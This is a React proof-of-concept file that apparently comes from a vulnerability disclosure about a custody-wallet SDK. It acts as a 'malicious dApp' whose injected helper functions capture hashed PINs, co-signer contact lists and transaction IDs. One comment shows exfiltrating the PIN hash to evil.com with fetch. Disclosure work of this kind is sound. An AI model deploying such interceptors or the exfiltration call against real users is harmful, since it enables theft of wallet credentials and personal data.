/**
 * PoC #4: SDK Helper Function Injection Vulnerability
 * 
 * =================================================================
 * NOTE: THIS CODE IS DEPLOYED LIVE IN `poc-app/src/App.tsx`
 * Use the `poc-app` project to run this PoC in a real React environment.
 * =================================================================
 * 
 * This file serves as the reference implementation for the malicious
 * dApp logic.
 */

import { useState } from 'react';
// import { VerifiedCustody } from '@verified-network/verified-custody'; // Uncomment when running with real SDK

/**
 * PoC: SDK Helper Function Injection Vulnerability
 * 
 * This application acts as a "Malicious dApp".
 * It integrates the verified-custody SDK but provides compromised
 * helper functions to intercept sensitive user data.
 */

function App() {
    const [logs, setLogs] = useState<string[]>([]);

    const addLog = (msg: string) => {
        setLogs(prev => [...prev, `${new Date().toLocaleTimeString()} - ${msg}`]);
        console.log(msg); // Also log to console for devtools
    };

    /**
     * MALICIOUS HELPER FUNCTIONS
     * These capture the sensitive data passed by the SDK
     */
    const maliciousHelpers = {
        sendCoSignerInvitation: async (
            channel: "sms" | "email",
            cosignerId: string,
            creatorId: string,
            hashedCreatorPin: string
        ) => {
            addLog(`🔓 INTERCEPTED: Co-signer Invite`);
            addLog(`   Target: ${cosignerId} (${channel})`);
            addLog(`   Creator: ${creatorId}`);
            addLog(`   ⚠️ PIN HASH: ${hashedCreatorPin}`);
            // In a real attack: fetch('https://evil.com', { body: hashedCreatorPin })
            return true;
        },

        sendCreatorConfirmation: async (
            channel: "sms" | "email",
            creatorId: string,
            cosignersList: Array<{ id: string; contact: string }>,
            requiredSigners: number
        ) => {
            addLog(`🔓 INTERCEPTED: Creator Confirmation`);
            addLog(`   Channel: ${channel}`);
            addLog(`   Creator: ${creatorId}`);
            addLog(`   Signers Required: ${requiredSigners}`);
            addLog(`   ⚠️ FULL CO-SIGNER LIST: ${JSON.stringify(cosignersList)}`);
            return true;
        },

        sendCreatorInitiation: async (
            channel: "sms" | "email",
            creatorId: string,
            hashedCreatorPin: string,
            txId: string,
            requiredSigners: number
        ) => {
            addLog(`🔓 INTERCEPTED: Transaction Initiation`);
            addLog(`   Channel: ${channel}`);
            addLog(`   Creator: ${creatorId}`);
            addLog(`   Signers Required: ${requiredSigners}`);
            addLog(`   TX ID: ${txId}`);
            addLog(`   ⚠️ PIN HASH: ${hashedCreatorPin}`);
            return true;
        },

        sendCreatorSigned: async (
            channel: "sms" | "email",
            creatorId: string,
            coSignerId: string
        ) => {
            addLog(`🔓 INTERCEPTED: Co-signer Signed`);
            addLog(`   Channel: ${channel}`);
            addLog(`   Creator: ${creatorId}`);
            addLog(`   Signer: ${coSignerId}`);
            return true;
        },

        sendCreatorCompleted: async (
            channel: "sms" | "email",
            creatorId: string,
            txId: string
        ) => {
            addLog(`🔓 INTERCEPTED: Transaction Completion`);
            addLog(`   Channel: ${channel}`);
            addLog(`   Creator: ${creatorId}`);
            addLog(`   TX ID: ${txId}`);
            return true;
        }
    };

    return (
        <div style={{ padding: '2rem', fontFamily: 'monospace' }}>
            <h1>🚨 Verified SDK Vulnerability PoC 🚨</h1>
            <p>
                This is a demonstration of the <strong>SDK Helper Function Injection</strong> vulnerability.
                Interact with the wallet component below (mocked or real) to see intercepted data.
            </p>

            <div style={{ border: '2px solid red', padding: '1rem', marginBottom: '2rem' }}>
                <h3>Intercepted Data Log:</h3>
                <div style={{ background: '#f0f0f0', padding: '1rem', height: '200px', overflowY: 'auto' }}>
                    {logs.length === 0 ? <em>Waiting for interaction...</em> : logs.map((l, i) => <div key={i}>{l}</div>)}
                </div>
            </div>

            <div style={{ border: '1px solid #ccc', padding: '1rem' }}>
                <h3>Verified Custody SDK Container</h3>
                <p>If the SDK is properly installed, the component should appear below:</p>

                {/* 
            UNCOMMENT THE COMPONENT BELOW TO RUN WITH REAL SDK 
            (Ensure @verified-network/verified-custody is installed)
        */}

                {/* 
        <VerifiedCustody 
            action="connect_wallet"
            chainId={84532}
            helperFunctions={maliciousHelpers}
        />
        */}

                <div style={{ background: '#eee', padding: '20px', textAlign: 'center' }}>
                    [ SDK Component Placeholder - Uncomment in code to activate ]
                    <br />
                    <button onClick={() => {
                        // Simulation for demonstration purposes
                        maliciousHelpers.sendCreatorInitiation("sms", "user-123", "0ffe1abd1a08215353c233d6e00961", "tx-999", 2);
                    }}>
                        Simulate SDK "Transaction Init" Event
                    </button>
                </div>

            </div>
        </div>
    );
}

export default App;
